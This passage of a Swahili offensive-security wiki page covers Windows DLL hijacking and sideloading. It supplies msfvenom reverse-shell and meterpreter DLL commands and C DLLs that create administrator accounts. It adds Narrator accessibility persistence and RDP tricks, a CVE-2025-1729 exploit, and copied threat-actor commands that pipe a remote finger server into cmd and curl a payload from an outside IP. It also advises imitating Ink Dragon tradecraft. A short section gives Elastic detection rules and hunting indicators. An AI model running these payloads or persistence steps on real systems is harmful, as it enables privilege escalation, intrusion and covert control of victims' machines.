Ikiwa masharti yametimizwa, angalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Ingawa lengo lake kuu ni UAC bypass, una DLL-hijacking PoCs za matoleo maalum ya Windows ambazo mara nyingi zinaweza kurekebishwa ili zitumie directory unayoweza kuandikia.

Kumbuka kwamba unaweza **kuangalia permissions zako kwenye folder** kwa kufanya:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Na **kagua ruhusa za folda zote zilizo ndani ya PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Unaweza pia kukagua imports za executable na exports za dll kwa kutumia:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Kwa mwongozo kamili wa jinsi ya **kutumia vibaya DLL Hijacking ili kuongeza ruhusa** ukiwa na ruhusa za kuandika kwenye **folda ya System Path**, angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia kama una ruhusa za kuandika kwenye folda yoyote ndani ya system PATH.\
Zana nyingine za kiotomatiki zinazovutia za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ukigundua hali inayoweza kutumiwa vibaya, mojawapo ya mambo muhimu zaidi ili kufanikiwa kuitumia ni **kuunda dll inayotoa angalau functions zote ambazo executable itazi-import kutoka humo**. Hata hivyo, kumbuka kuwa DLL Hijacking inaweza kusaidia [kuongeza ruhusa kutoka kiwango cha Medium Integrity hadi High **(kukwepa UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa DLL hijacking unaolenga DLL hijacking kwa ajili ya execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata **mifano ya msingi ya code za dll** ambazo zinaweza kuwa muhimu kama **templates** au kwa kuunda **dll inayotoa functions zisizohitajika**.

## **Kuunda na kucompile DLLs**

### **DLL Proxifying**

Kimsingi **DLL proxy** ni DLL inayoweza **kutekeleza code yako hasidi inapopakiwa**, lakini pia **kufichua** na **kufanya kazi** kama **inavyotarajiwa** kwa **kuelekeza calls zote kwenye library halisi**.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza **kubainisha executable na kuchagua library** unayotaka kuifanyia proxify, kisha **kutengeneza dll iliyofanyiwa proxify**; au **kubainisha DLL** na **kutengeneza dll iliyofanyiwa proxify**.

### **Meterpreter**

**Pata rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Pata meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Unda mtumiaji (x86; sikuona toleo la x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Yako mwenyewe

Katika hali nyingi, DLL unayo-compile lazima i-export kila function inayo-importiwa na process ya victim. Ikiwa export inayohitajika haipo, binary haiwezi ku-resolve na exploit hushindwa.

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Mfano wa C++ DLL wenye uundaji wa mtumiaji</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL mbadala ya C yenye sehemu ya kuingilia ya thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### NativeAOT DLL yenye uanzishaji unaochochewa na export

**.NET NativeAOT shared library** inayojitegemea inaweza kutumika kama native DLL iliyowekwa bila kutekeleza `DllMain` moja kwa moja. Export static C# methods kwa `[UnmanagedCallersOnly(EntryPoint = "...")]`; native host inapopiga mojawapo ya entry points hizi zinazozalishwa na compiler, NativeAOT huanzisha module na method ya `[ModuleInitializer]` huendeshwa kabla ya body ya C# iliyowekwa kwenye export. Output haihitaji .NET runtime iliyosakinishwa kando.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL bado inahitaji **majina ya export na signatures zinazooana na ABI** ambazo host iliyochaguliwa huita. Stubs ndogo zinaweza kutosha kuanzisha module, lakini export zisizokuwepo zinaweza kuzuia kupakia DLL na signature isiyo sahihi inaweza kuharibu call. Orodhesha imports za host na hakiki matokeo kwa kutumia `dumpbin /exports payload.dll` kabla ya kubadilisha jina la output liwe jina la dependency linalotarajiwa na host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>NativeAOT DLL yenye exports ndogo</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Sanidi mradi uwe maktaba ya pamoja ya asili ya Windows inayojitosheleza:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Weka DLL iliyobadilishwa jina karibu na executable iliyo hatarishi uliyonakili, kisha anzisha host kupitia njia ya msimbo inayoita export inayooana. Mbinu hii ya initializer huepusha kuweka kazi changamano moja kwa moja ndani ya `DllMain`, lakini masharti ya awali ya sideload hayabadilika: loader lazima itatue dependency kwa jina, ichague saraka ya programu, na isiipate kwanza kupitia KnownDLLs, module ambayo tayari imepakiwa, uelekezaji upya wa SxS, au flags zilizowekewa vizuizi za `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Kwa templates za kawaida za native, angalia [Payloads za C za Windows](../windows-c-payloads.md). First stage iliyosideloadiwa inaweza baadaye kutekeleza [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), lakini hiyo ni mbinu tofauti ya injection, si sehemu ya utatuzi wa DLL.

## Ugunduzi: Upakiaji wa library kupitia DLL masquerading

Elastic Defend 9.5.0 huongeza maelezo kwenye tukio la library-load kwa `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` wakati faili iliyopakiwa haijasainiwa na Microsoft na jina lake la faili linagongana na orodha ya majina ya Windows/system DLL zilizohifadhiwa kwenye cache ya Elastic. Hii huhamishia uchanganuzi wa orodha ya majina ya faili, maeneo ya mfumo na sahihi kwenye endpoint sensor; kwa hivyo, EQL ya msingi inaweza kupunguzwa kuwa:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Chukulia data hii ya ziada kama kidokezo muhimu cha kufuatilia, si uthibitisho wa moja kwa moja. Ongeza kiwango cha uhakika pale host iliyosainiwa inapopakia DLL kutoka kwenye saraka yake yenyewe **inayoweza kuandikwa na mtumiaji**, DLL haijasainiwa/haijaaminika, na `dll.Ext.relative_file_creation_time` inaonyesha kuwa iliundwa muda mfupi kabla ya kupakiwa. Weka vizuizi vya upeo kwenye mchanganyiko halisi wa publisher + host process + installation path; usizime ufuatiliaji wa jina linalogongana la DLL kimataifa, kwa sababu installers na applications halali zinaweza kusambaza maktaba zao binafsi zenye majina yanayofanana na ya mfumo.<sup>[[26]](#references)</sup>

Kwenye sensors zisizo na data hiyo ya ziada, kadiria tabia hiyo kwa kuoanisha jina la DLL linalogongana na load path isiyo ya mfumo, kutokuwepo kwa sahihi ya Microsoft au sahihi isiyoaminika, na muda mfupi kati ya uundaji wa faili na kupakiwa kwake. Hili linahitaji orodha ya majina ya DLL inayosasishwa na vizuizi finyu kwa `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS`, na njia nyingine zilizoidhinishwa za deployment.<sup>[[26]](#references)</sup>

## Uchunguzi wa Kisa: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado huchunguza localization DLL inayotabirika na inayotegemea lugha inapoanzishwa; DLL hii inaweza kutekwa nyara ili kutekeleza code kiholela na kupata persistence.<sup>[[7]](#references)</sup>

Mambo muhimu
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayodhibitiwa na mshambuliaji na inayoweza kuandikwa ipo kwenye OneCore path, inapakiwa na `DllMain(DLL_PROCESS_ATTACH)` hutekelezwa. Hakuna exports zinazohitajika.

Ugunduzi kwa kutumia Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Anzisha Narrator na uangalie jaribio la kupakia path iliyo hapo juu.

DLL ndogo zaidi
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Ukimya wa OPSEC
- Hijack ya kawaida itaongea/itaangazia UI. Ili usisikike, wakati wa attach orodhesha threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na uisimamishe kwa `SuspendThread`; endelea katika thread yako mwenyewe. Tazama PoC kwa code kamili.<sup>[[8]](#references)</sup>

Kuchochea na kudumisha kupitia usanidi wa Accessibility
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa mipangilio iliyo hapo juu, kuwasha Narrator hupakia DLL iliyowekwa. Kwenye secure desktop (skrini ya kuingia), bonyeza CTRL+WIN+ENTER ili kuwasha Narrator; DLL yako hutekelezwa kama SYSTEM kwenye secure desktop.

Utekelezaji wa SYSTEM unaochochewa na RDP (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Unganisha kwa RDP kwenye host, kisha kwenye skrini ya kuingia bonyeza CTRL+WIN+ENTER ili kuwasha Narrator; DLL yako hutekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji hukoma kipindi cha RDP kinapofungwa—inject/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili ingizo la registry la Accessibility Tool (AT) iliyojengewa ndani (kwa mfano, CursorIndicator), kulihariri ili lielekeze kwenye binary/DLL yoyote, kuliingiza, kisha kuweka `configuration` kwa jina la AT hiyo. Hii huwakilisha utekelezaji wowote kupitia mfumo wa Accessibility.

Maelezo
- Kuandika ndani ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuwekwa ndani ya `DLL_PROCESS_ATTACH`; hakuna exports zinazohitajika.

## Uchunguzi wa Kisa: CVE-2025-1729 - Kuongeza Haki kwa Kutumia TPQMAssistant.exe

Kisa hiki kinaonyesha **Phantom DLL Hijacking** katika Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Maelezo ya Athari

- **Kipengele**: `TPQMAssistant.exe` kilicho katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Kazi Iliyopangwa**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` huendeshwa kila siku saa 9:30 AM katika muktadha wa mtumiaji aliyeingia.
- **Ruhusa za Saraka**: Inaweza kuandikwa na `CREATOR OWNER`, hivyo kuruhusu watumiaji wa ndani kuweka faili zozote.
- **Tabia ya Utafutaji wa DLL**: Hujaribu kupakia `hostfxr.dll` kutoka kwenye working directory yake kwanza na kurekodi "NAME NOT FOUND" ikiwa haipo, jambo linaloonyesha kuwa utafutaji wa saraka ya ndani una kipaumbele.

### Utekelezaji wa Exploit

Mshambulizi anaweza kuweka stub hasidi ya `hostfxr.dll` katika saraka hiyo hiyo, akitumia DLL inayokosekana ili kupata utekelezaji wa code katika muktadha wa mtumiaji:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Mfuatano wa Mashambulizi

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` ndani ya `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri scheduled task iendeshwe saa 9:30 AM katika muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati task inaendeshwa, DLL hasidi huendeshwa katika session ya msimamizi kwa medium integrity.
4. Unganisha mbinu za kawaida za UAC bypass ili kupanda kutoka medium integrity hadi SYSTEM privileges.

## Uchunguzi wa Kesi: MSI CustomAction Dropper + DLL Side-Loading kupitia Signed Host (wsc_proxy.exe)

Wahusika tishio mara nyingi huunganisha droppers zinazotumia MSI na DLL side-loading ili kutekeleza payloads chini ya mchakato unaoaminika na uliotiwa saini.<sup>[[10]](#references)</sup>

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. CustomAction huendeshwa kimyakimya wakati wa usakinishaji wa GUI (kwa mfano, LaunchApplication au kitendo cha VBScript), na kuunda upya hatua inayofuata kutoka kwa rasilimali zilizopachikwa.
- Dropper huandika EXE halali iliyotiwa saini na DLL hasidi kwenye saraka moja (jozi ya mfano: wsc_proxy.exe iliyotiwa saini na Avast + wsc.dll inayodhibitiwa na mshambuliaji).
- Signed EXE inapoanzishwa, mpangilio wa utafutaji wa DLL wa Windows hupakia kwanza wsc.dll kutoka kwenye working directory, na kutekeleza msimbo wa mshambuliaji chini ya mchakato mzazi uliotiwa saini (ATT&CK T1574.001).

Uchambuzi wa MSI (vitu vya kuangalia)
- Jedwali la CustomAction:
  - Tafuta maingizo yanayoendesha executables au VBScript. Mfano wa muundo unaotia shaka: LaunchApplication inayoendesha faili iliyopachikwa chinichini.
  - Katika Orca (Microsoft Orca.exe), kagua jedwali la CustomAction, InstallExecuteSequence na Binary.
- Payloads zilizopachikwa/zinazogawanywa ndani ya MSI CAB:
  - Toa faili kwa njia ya kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Au tumia lessmsi: lessmsi x package.msi C:\out
  - Tafuta vipande vingi vidogo vinavyounganishwa na kufumbwa kwa usimbaji na CustomAction ya VBScript. Mfuatano wa kawaida ni:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- Weka faili hizi mbili kwenye folda moja:
  - wsc_proxy.exe: host halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
  - wsc.dll: DLL ya mshambuliaji. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na u-forward exports zinazohitajika kwenye library halisi huku ukiendesha payload katika DllMain.
- Tengeneza payload ndogo ya DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Kwa mahitaji ya exports, tumia mfumo wa proxying (kwa mfano, DLLirant/Spartacus) ili kutengeneza DLL ya forwarding ambayo pia huendesha payload yako.

- Mbinu hii hutegemea utatuzi wa majina ya DLL unaofanywa na host binary. Ikiwa host hutumia njia kamili au alama za upakiaji salama (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), huenda hijack isifaulu.
- KnownDLLs, SxS na forwarded exports zinaweza kuathiri mpangilio wa kipaumbele, na lazima zizingatiwe wakati wa kuchagua host binary na seti ya exports.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point ilieleza jinsi Ink Dragon inavyotumia **triad ya faili tatu** kusawazika na programu halali huku ikiweka payload kuu ikiwa imesimbwa kwenye diski:<sup>[[12]](#references)</sup>

1. **EXE ya host iliyotiwa saini** – wauzaji kama AMD, Realtek au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambuliaji hubadilisha jina la executable ili ifanane na binary ya Windows (kwa mfano `conhost.exe`), lakini sahihi ya Authenticode hubaki halali.
2. **Loader DLL hasidi** – huwekwa karibu na EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL hii kwa kawaida ni binary ya MFC iliyofichwa kwa kutumia mfumo wa ScatterBrain; kazi yake pekee ni kutafuta blob iliyosimbwa, kuifungua usimbaji, na kufanya reflective mapping ya ShadowPad.
3. **Blob ya payload iliyosimbwa** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye saraka hiyo hiyo. Baada ya kupangia payload iliyofunguliwa usimbaji kwenye kumbukumbu, loader hufuta faili la TMP ili kuharibu ushahidi wa forensic.

Vidokezo vya tradecraft:

* Kubadilisha jina la EXE iliyotiwa saini (huku ukihifadhi `OriginalFileName` yake ya awali kwenye kichwa cha PE) huiwezesha kujifanya binary ya Windows huku ikihifadhi sahihi ya muuzaji. Kwa hiyo, iga mazoea ya Ink Dragon ya kuweka binaries zinazoonekana kama `conhost.exe` ambazo kwa kweli ni huduma za AMD/NVIDIA.
* Kwa kuwa executable hubaki kuaminika, vidhibiti vingi vya allowlisting vinahitaji tu DLL yako hasidi iwekwe karibu nayo. Zingatia kubinafsisha loader DLL; kwa kawaida, parent iliyotiwa saini inaweza kuendeshwa bila kubadilishwa.
* Decryptor ya ShadowPad inahitaji blob ya TMP iwe karibu na loader na iweze kuandikwa ili iweze kufuta faili baada ya kuipangia kwenye kumbukumbu. Acha saraka iweze kuandikwa hadi payload ipakie; ikiwa kwenye kumbukumbu, faili la TMP linaweza kufutwa kwa usalama kwa OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Waendeshaji huunganisha DLL sideloading na LOLBAS ili artifact pekee maalum iliyo kwenye diski iwe DLL hasidi iliyo karibu na EXE inayoaminika:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell iliyofichwa huanzisha `cmd.exe /c`, hupata amri kutoka kwa seva ya Finger, na kuzipeleka kwa `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` huchukua maandishi kupitia TCP/79; `| cmd` hutekeleza jibu la server, hivyo kuruhusu waendeshaji kubadilisha second stage upande wa server.

- **Upakuaji/uchimbuaji uliojengewa ndani:** Pakua archive yenye extension isiyo na madhara, ichimbue, kisha weka sideload target pamoja na DLL chini ya folda ya `%LocalAppData%` yenye jina nasibu:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` huficha taarifa za maendeleo na hufuata redirects; `tar -xf` hutumia tar iliyojengewa ndani ya Windows.

- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe mchakato ulioundwa na CIM wakati inapakia DLL iliyo kwenye folda hiyo hiyo:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Hufanya kazi na binaries zinazopendelea DLL za ndani (kwa mfano, `intelbq.exe`, `nearby_share.exe`); payload (kwa mfano, Remcos) huendeshwa chini ya jina linaloaminika.

- **Hunting:** Toa tahadhari kuhusu `forfiles` pale `/p`, `/m`, na `/c` zinapotokea pamoja; matumizi yake si ya kawaida nje ya script za usimamizi.


## Uchunguzi wa Kesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uvamizi wa hivi majuzi wa Lotus Blossom ulitumia vibaya mnyororo wa sasisho unaoaminika kusambaza dropper iliyofungwa kwa NSIS, iliyoweka DLL sideload pamoja na payloads zinazoishi kikamilifu kwenye kumbukumbu.<sup>[[13]](#references)</sup>

Mtiririko wa mbinu
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka alama ya **HIDDEN**, huweka Bitdefender Submission Wizard `BluetoothService.exe` yenye jina lililobadilishwa, `log.dll` hasidi, na blob iliyosimbwa kwa njia fiche `BluetoothService`, kisha huzindua EXE.
- Host EXE huleta `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hupakia blob kwa kutumia mmap; `LogWrite` huisimbua kwa kutumia mkondo maalum wa LCG (thamani zisizobadilika **0x19660D** / **0x3C6EF35F**, nyenzo za ufunguo zimetokana na hash ya awali), huandika shellcode ya maandishi wazi juu ya buffer, huachilia temp, na kurukia humo.
- Ili kuepuka IAT, loader hutatua APIs kwa kuhesabu hash za majina ya export kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia avalanche ya mtindo wa Murmur (**0x85EBCA6B**) na kulinganisha matokeo na hash lengwa zilizotiwa chumvi.

Shellcode kuu (Chrysalis)
- Husimbua moduli kuu inayofanana na PE kwa kurudia add/XOR/sub kwa ufunguo `gQ2JR&9;` katika mizunguko mitano, kisha hupakia `Kernel32.dll` → `GetProcAddress` kwa nguvu ili kukamilisha utatuzi wa import.
- Hujenga upya mifuatano ya majina ya DLL wakati wa utekelezaji kupitia mabadiliko ya bit-rotate/XOR kwa kila herufi, kisha hupakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia resolver ya pili inayopitia **PEB → InMemoryOrderModuleList**, kuchanganua kila jedwali la export katika vitalu vya baiti 4 kwa mchanganyiko wa mtindo wa Murmur, na kutumia `GetProcAddress` tu kama hash haipatikani.

Usanidi uliopachikwa na C2
- Usanidi upo ndani ya faili iliyowekwa ya `BluetoothService` kwenye **offset 0x30808** (ukubwa **0x980**) na husimbuliwa kwa RC4 kwa kutumia ufunguo `qwhvb^435h&*7`, kufichua URL ya C2 na User-Agent.
- Beacons huunda wasifu wa host uliotenganishwa kwa nukta, huweka tag `4Q` mwanzoni, kisha husimba kwa RC4 kwa kutumia ufunguo `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Majibu husimbuliwa kwa RC4 na kusambazwa kwa kutumia tag switch (`4T` shell, `4V` utekelezaji wa process, `4W/4X` uandishi wa faili, `4Y` usomaji/utoaji wa data, `4\\` uondoaji, `4` uorodheshaji wa drive/faili pamoja na hali za uhamishaji wa vipande).
- Hali ya utekelezaji inadhibitiwa na CLI args: bila args = husakinisha persistence (service/Run key) inayoelekeza kwa `-i`; `-i` huzindua upya yenyewe kwa `-k`; `-k` huruka usakinishaji na kuendesha payload.

Loader mbadala iliyozingatiwa
- Uvamizi huohuo uliweka Tiny C Compiler na kutekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, huku `libtcc.dll` ikiwa pembeni yake. C source iliyotolewa na mshambulizi ilipachika shellcode, ikaikompile na kuiendesha kwenye kumbukumbu bila kuweka PE kwenye diski. Iga kwa kutumia:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Hatua hii ya compile-and-run inayotegemea TCC iliingiza `Wininet.dll` wakati wa runtime na kupakua shellcode ya hatua ya pili kutoka URL iliyowekwa moja kwa moja kwenye code, hivyo kutoa loader inayoweza kubadilika na kujifanya kuwa uendeshaji wa compiler.

## Signed-host sideloading with export proxying + host thread parking

Baadhi ya DLL sideloading chains huongeza **uimarishaji wa uthabiti** ili host halali ibaki hai kwa muda wa kutosha kupakia hatua za baadaye bila matatizo, badala ya ku-crash baada ya kupakia DLL hasidi.<sup>[[11]](#references)</sup>

Muundo unaoonekana
- Weka EXE inayoaminika kando ya DLL hasidi yenye jina linalotarajiwa la dependency, kama `version.dll`.
- DLL hasidi **hupitisha kila export inayotarajiwa** kwa DLL halisi ya mfumo (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili utatuzi wa imports uendelee kufanikiwa na mchakato wa host uendelee kufanya kazi.
- Baada ya kupakiwa, DLL hasidi **hubandika entry point ya host** ili thread kuu iingie kwenye kitanzi kisicho na mwisho cha `Sleep` badala ya kutoka au kuendesha njia za code zitakazositisha mchakato.
- Thread mpya hufanya kazi hasidi halisi: kusimbua jina au njia ya DLL ya hatua inayofuata (RC4/XOR hutumika mara nyingi), kisha kuizindua kwa `LoadLibrary`.

Kwa nini hili ni muhimu
- DLL proxying ya kawaida huhifadhi ulinganifu wa API, lakini haihakikishi kuwa host itabaki hai kwa muda wa kutosha kwa hatua za baadaye.
- Kuweka thread kuu kwenye `Sleep(INFINITE)` ni njia rahisi ya kufanya mchakato uliosainiwa ubaki kwenye kumbukumbu huku loader ikifanya usimbuaji, staging, au uanzishaji wa mtandao kwenye worker thread.
- Kutafuta tu `DllMain` inayotia shaka kunaweza kukosa muundo huu ikiwa tabia muhimu hutokea baada ya kubandika entry point ya host na thread ya pili kuanza.

Mtiririko wa chini kabisa
1. Nakili EXE ya host iliyosainiwa na ubaini DLL inayoipakia kutoka kwenye saraka ya ndani.
2. Tengeneza proxy DLL inayotoa functions zilezile na kuzielekeza kwa DLL halali.
3. Kwenye `DllMain(DLL_PROCESS_ATTACH)`, unda worker thread.
4. Kutoka kwenye thread hiyo, bandika entry point ya host au utaratibu wa kuanzisha thread kuu ili izunguke kwenye `Sleep`.
5. Simbua jina/config ya DLL ya hatua inayofuata na uite `LoadLibrary` au upakie payload kwa manual-map.

Viashiria vya ulinzi
- Michakato iliyosainiwa inayopakia `version.dll` au libraries nyingine za kawaida kutoka saraka ya programu yenyewe badala ya `System32`.
- Mabadiliko ya kumbukumbu kwenye entry point ya mchakato muda mfupi baada ya kupakia image, hasa jumps/calls zinazoelekezwa kwa `Sleep`/`SleepEx`.
